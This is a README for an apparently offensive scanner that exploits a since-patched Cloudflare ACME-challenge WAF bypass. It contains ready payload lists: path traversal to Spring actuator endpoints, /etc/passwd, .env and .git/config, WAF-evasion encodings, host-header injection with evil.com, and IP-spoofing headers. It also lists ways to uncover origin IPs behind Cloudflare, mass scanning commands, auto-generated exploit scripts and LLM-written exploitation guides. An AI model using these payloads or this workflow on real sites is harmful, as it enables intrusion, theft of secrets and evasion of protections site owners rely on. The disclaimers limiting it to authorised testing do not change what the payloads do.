# Cloudflare ACME Challenge WAF Bypass Scanner

## 📖 Research Reference
Based on **FearsOff Research**: [Cloudflare Zero-day: Accessing Any Host Globally](https://fearsoff.org/research/cloudflare-acme)

**Vulnerability**: Requests to `/.well-known/acme-challenge/{token}` were evaluated on a different code path - an implicit exception that executed **before** customer WAF blocking rules.

**Status**: Fixed by Cloudflare on October 27, 2025

## ⚠️ Disclaimer
This tool is created **ONLY** for:
- Authorized penetration testing
- Security research
- Bug bounty programs with written permission
- Educational purposes

**PROHIBITED** to use this tool for illegal activities or without authorization!

## 📋 Description
**Comprehensive** Cloudflare vulnerability scanner testing multiple attack vectors.

**Techniques used**:
1. **ACME WAF Bypass** - Requests to `/.well-known/acme-challenge/{token}` bypass WAF rules
2. **Path Traversal** - `..;/` (servlet stacks), `../` (PHP), URL encoding variants
3. **Cache Poisoning** - X-Forwarded-Host, cache key manipulation
4. **Host Header Injection** - Host, X-Forwarded-Host, X-Host manipulation
5. **Rate Limit Bypass** - IP spoofing headers (X-Forwarded-For, CF-Connecting-IP, etc.)
6. **HTTP Request Smuggling** - CL.TE and TE.CL techniques
7. **Sensitive Path Exposure** - Admin panels, configs, debug endpoints via ACME path

## 🔍 Features

### Core Features
- ✅ Cloudflare protection detection
- ✅ WAF Bypass detection (origin vs CF response)
- ✅ **Origin IP discovery** (subdomains, MX, SPF, DNS history)
- ✅ Framework auto-detection (Spring, PHP, Next.js, Express, etc.)
- ✅ Token verification (confirms bypass is not false positive)
- ✅ Multi-threading & JSON output

### Vulnerability Tests
| Category | Payloads | Description |
|----------|----------|-------------|
| **ACME WAF Bypass** | 3 | Core bypass via /.well-known/acme-challenge/ |
| **Spring Actuator** | 19 | `..;/` traversal to actuator endpoints |
| **PHP LFI** | 9 | Local File Inclusion via path traversal |
| **Next.js SSR** | 7 | Server-side rendering data exposure |
| **Path Traversal** | 6 | Multiple encoding techniques |
| **CF WAF Bypass** | 14 | URL encoding, unicode, null bytes |
| **CF Specific Paths** | 12 | /cdn-cgi/, /.well-known/ paths |
| **Cache Poisoning** | 4 | X-Forwarded-Host, cache key manipulation |
| **Host Header Injection** | 8 | Multiple host header variations |
| **Rate Limit Bypass** | 12 | IP spoofing headers |
| **Sensitive Paths** | 25 | Admin, configs, debug via ACME bypass |
| **GraphQL** | 3 | Introspection via ACME path |
| **Header Bypass** | 6 | X-middleware-subrequest, etc. |

### Origin IP Discovery Methods
1. **Response Headers** - X-Served-By, X-Backend-Server, Via, etc.
2. **Response Body** - IP leak in error messages/debug info
3. **Subdomain Enumeration** - 31 common subdomains (direct, origin, mail, api, etc.)
4. **MX Records** - Mail servers often expose origin IP
5. **SPF Records** - ip4: directives in TXT records
6. **DNS History API** - hackertarget.com historical DNS
7. **Error Pages** - Trigger errors to leak IP

## 🛠️ Installation

```bash
# Clone repository
git clone https://github.com/yourusername/Cloudflare-0day.git
cd Cloudflare-0day

# Install dependencies
pip install -r requirements.txt
```

## 🚀 Usage

### Scan single target:
```bash
python scanner.py -u https://example.com
```

### Scan with custom token:
```bash
# Token can be obtained from Cloudflare SSL/TLS Custom Hostnames (pending validation)
python scanner.py -u https://example.com --token "yMnWOcR2yv0yW-...Jm5QksreNRDUmqKfKPTk"
```

### Scan from file list:
```bash
python scanner.py -l targets.txt -o results.json
```

### With full options:
```bash
python scanner.py -u https://example.com -t 5 -T 15 -d 1 -v -o results.json
```

## 📖 Parameters

| Parameter | Description | Default |
|-----------|-------------|---------|
| `-u, --url` | Single target URL | - |
| `-l, --list` | File containing target list | - |
| `-t, --threads` | Number of threads | 10 |
| `-T, --timeout` | Request timeout (seconds) | 10 |
| `-d, --delay` | Delay between requests (seconds) | 0 |
| `-o, --output` | Output file (JSON) | - |
| `-v, --verbose` | Verbose mode | False |
| `--token` | Custom ACME challenge token | Random |

## 🎯 Payload Examples

### 1. Spring Boot Actuator (..;/ traversal)
```
/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/env
/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/health
/.well-known/acme-challenge/{token}/..;/..;/..;/..;/actuator/heapdump
```

### 2. PHP LFI
```
/.well-known/acme-challenge/{token}/../../../../etc/passwd
/.well-known/acme-challenge/{token}/../../../../etc/hosts
```

### 3. Next.js / SSR
```
/.well-known/acme-challenge/{token}/../_next/data/
/.well-known/acme-challenge/{token}/..;/api/config
```

### 4. WAF Bypass Encoding
```
/%2e%2e/%2e%2e/%2e%2e/etc/passwd
/%252e%252e/%252e%252e/etc/passwd (double encoding)
/..%c0%af../etc/passwd (unicode normalization)
/admin%00.js (null byte injection)
```

### 5. Cache Poisoning
```
X-Forwarded-Host: evil.com
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

### 6. Host Header Injection
```
Host: evil.com
X-Forwarded-Host: evil.com
X-Host: evil.com
Forwarded: host=evil.com
```

### 7. Rate Limit Bypass
```
X-Forwarded-For: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
```

### 8. Sensitive Paths via ACME
```
/.well-known/acme-challenge/{token}/../.git/config
/.well-known/acme-challenge/{token}/../.env
/.well-known/acme-challenge/{token}/../admin
/.well-known/acme-challenge/{token}/../graphql?query={__schema{types{name}}}
```

## 🔎 Origin IP Discovery Methods

The scanner attempts to find the real origin IP through:
1. **Response Headers** - X-Served-By, X-Backend-Server, Via, etc.
2. **Response Body** - IPs leaked in content
3. **Subdomain Enumeration** - mail, ftp, cpanel, staging, dev, etc. (31 subdomains)
4. **MX Records** - Mail exchanger records
5. **SPF Records** - IPs in SPF TXT record
6. **DNS History API** - hackertarget.com free API
7. **Error Pages** - Trigger errors that may leak IP

## 🤖 Auto POC Generation

Generate exploit proof-of-concept files automatically:

```bash
# Generate POC files
python scanner.py -l targets.txt --poc

# Custom output directory
python scanner.py -l targets.txt --poc --poc-dir my_exploits
```

**Generated files:**
- `poc_<target>.py` - Python exploit script
- `poc_<target>.sh` - Curl/Bash script
- `nuclei_<target>.yaml` - Nuclei template
- `burp_<target>.txt` - Burp Suite requests

## 🧠 LLM Analysis

Analyze vulnerabilities with AI:

```bash
# OpenAI GPT-4
python scanner.py -l targets.txt --analyze --llm openai --api-key sk-xxx

# Anthropic Claude
python scanner.py -l targets.txt --analyze --llm anthropic --api-key sk-ant-xxx

# Local Ollama (free, no API key)
python scanner.py -l targets.txt --analyze --llm ollama --model llama3.2

# Groq (fast, free tier available)
python scanner.py -l targets.txt --analyze --llm groq

# Save analysis to file
python scanner.py -l targets.txt --analyze --llm openai --analysis-output report.md
```

**Supported LLM Providers:**
| Provider | Model (default) | API Key Env Var |
|----------|-----------------|-----------------|
| OpenAI | gpt-4o | `OPENAI_API_KEY` |
| Anthropic | claude-sonnet-4-20250514 | `ANTHROPIC_API_KEY` |
| Ollama | llama3.2 | Not required (local) |
| Groq | llama-3.3-70b-versatile | `GROQ_API_KEY` |

**LLM Analysis includes:**
- Risk Assessment (Critical/High/Medium/Low)
- Attack Chain analysis
- Impact Analysis  
- Step-by-step Exploitation Guide
- Remediation recommendations
- CVSS 3.1 Score estimation

## 📊 Output Example
```
[*] Scanning: https://target.com
  [CF Protected] Baseline Status: 403
  [!] WAF BYPASS DETECTED - Origin responding on ACME path!
  [*] Successful token: abc123...
  [!] CONFIRMED - Multiple tokens bypass WAF (vulnerability confirmed)
  [*] Detected Framework: spring
  [*] Attempting to find Origin IP...
  [*] Checking 31 subdomains for origin IP...
      [+] Found via DNS history: 1.2.3.4 (mail.target.com)
  [+] Potential Origin IP(s) Found:
      → 1.2.3.4 (Source: DNS History: mail.target.com)
  [*] Testing Spring Boot Actuator endpoints...
  [CRITICAL] https://target.com/.well-known/acme-challenge/xxx/..;/..;/..;/..;/actuator/env
    └── Sensitive data exposed!
  [*] Testing cache poisoning vectors...
  [*] Testing host header injection...
  [*] Testing rate limit bypass headers...
  [*] Testing sensitive paths via ACME bypass...

[*] Generating exploit POCs...
  [+] Generated: pocs/poc_target_com.py
  [+] Generated: pocs/poc_target_com.sh
  [+] Generated: pocs/nuclei_target_com.yaml
  [+] Generated: pocs/burp_target_com.txt

[*] Starting LLM analysis with openai...
=================================================================
  LLM ANALYSIS: https://target.com
=================================================================

## Risk Assessment: HIGH
...
```

## 🔬 How It Works

1. **Baseline Check**: Request to root path to get normal response (usually CF block page)
2. **WAF Bypass Test**: Request to `/.well-known/acme-challenge/{token}` - if response differs from baseline, WAF is bypassed
3. **Token Verification**: Test multiple random tokens to confirm vulnerability (not false positive)
4. **Framework Detection**: Identify framework from response (Spring, PHP, Next.js, etc.)
5. **Origin IP Discovery**: Attempt to find real server IP through various methods
6. **Vulnerability Scanning**: Test all vulnerability categories (Actuator, LFI, Cache, Host Header, etc.)
7. **Sensitive Path Enumeration**: Access admin/config paths via ACME path traversal
8. **POC Generation**: Auto-generate exploit scripts (Python, Bash, Nuclei, Burp)
9. **LLM Analysis**: AI-powered vulnerability analysis and exploitation guidance

## 📚 Timeline (from FearsOff)
- **October 9, 2025** - Submitted via HackerOne
- **October 13, 2025** - Vendor validation started
- **October 14, 2025** - Triaged by HackerOne
- **October 27, 2025** - Final fix deployed

## ⚡ Tips
1. Use `--token` with valid token from Cloudflare Custom Hostnames for more accurate results
2. Use delay (`-d 1`) to avoid rate limiting
3. Targets that are still vulnerable should have been patched (Oct 2025)
4. Use external tools for more origin IP discovery: SecurityTrails, Censys, Shodan

## 📜 Legal
Ensure you have written permission before performing security testing on any target. Use of this tool is entirely your responsibility.

## 🔗 References
- [FearsOff Research](https://fearsoff.org/research/cloudflare-acme)
- [Cloudflare Blog](https://blog.cloudflare.com/acme-path-vulnerability/)

## 📝 License
MIT License - See LICENSE file for details
